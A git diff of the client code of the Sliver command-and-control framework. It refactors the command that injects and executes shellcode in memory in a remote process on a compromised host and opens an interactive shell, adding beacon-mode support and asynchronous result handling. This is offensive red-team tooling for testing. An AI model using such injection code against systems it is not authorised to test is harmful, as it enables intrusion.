@@ -29,20 +29,26 @@ import (
 
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"golang.org/x/crypto/ssh/terminal"
+	"google.golang.org/protobuf/proto"
 
 	"github.com/desertbit/grumble"
 )
 
 // ExecuteShellcodeCmd - Execute shellcode in-memory
 func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
-	session := con.ActiveSession.GetInteractive()
-	if session == nil {
+	session, beacon := con.ActiveTarget.GetInteractive()
+	if session == nil && beacon == nil {
 		return
 	}
 
 	interactive := ctx.Flags.Bool("interactive")
+	if interactive && beacon != nil {
+		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
+		return
+	}
 	pid := ctx.Flags.Uint("pid")
 	shellcodePath := ctx.Args.String("filepath")
 	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
@@ -61,11 +67,11 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
-	task, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
+	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
 		Data:     shellcodeBin,
 		RWXPages: ctx.Flags.Bool("rwx-pages"),
 		Pid:      uint32(pid),
-		Request:  con.ActiveSession.Request(ctx),
+		Request:  con.ActiveTarget.Request(ctx),
 	})
 	ctrl <- true
 	<-ctrl
@@ -73,16 +79,34 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("%s\n", err)
 		return
 	}
+
+	if shellcodeTask.Response != nil && shellcodeTask.Response.Async {
+		con.AddBeaconCallback(shellcodeTask.Response.TaskID, func(task *clientpb.BeaconTask) {
+			err = proto.Unmarshal(task.Response, shellcodeTask)
+			if err != nil {
+				con.PrintErrorf("Failed to decode response %s\n", err)
+				return
+			}
+			PrintExecuteShellcode(shellcodeTask, con)
+		})
+		con.PrintAsyncResponse(shellcodeTask.Response)
+	} else {
+		PrintExecuteShellcode(shellcodeTask, con)
+	}
+}
+
+// PrintExecuteShellcode - Display result of shellcode execution
+func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient) {
 	if task.Response.GetErr() != "" {
 		con.PrintErrorf("%s\n", task.Response.GetErr())
-		return
+	} else {
+		con.PrintInfof("Executed shellcode on target\n")
 	}
-	con.PrintInfof("Executed shellcode on target\n")
 }
 
 func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverConsoleClient) {
 	// Check active session
-	session := con.ActiveSession.GetInteractive()
+	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
@@ -97,21 +121,21 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	})
 
 	if err != nil {
-		con.PrintErrorf("Error: %v\n", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 
 	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
 	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
-		Request:   con.ActiveSession.Request(ctx),
+		Request:   con.ActiveTarget.Request(ctx),
 		Path:      hostProc,
 		EnablePTY: !noPty,
 		TunnelID:  tunnel.ID,
 	})
 
 	if err != nil {
-		con.PrintErrorf("Error: %v\n", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 	// Retrieve PID and start remote task
@@ -121,7 +145,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
 	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
-		Request:  con.ActiveSession.Request(ctx),
+		Request:  con.ActiveTarget.Request(ctx),
 		Pid:      pid,
 		Data:     shellcode,
 		RWXPages: rwxPages,
@@ -130,7 +154,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	<-ctrl
 
 	if err != nil {
-		con.PrintErrorf("Error: %v", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 
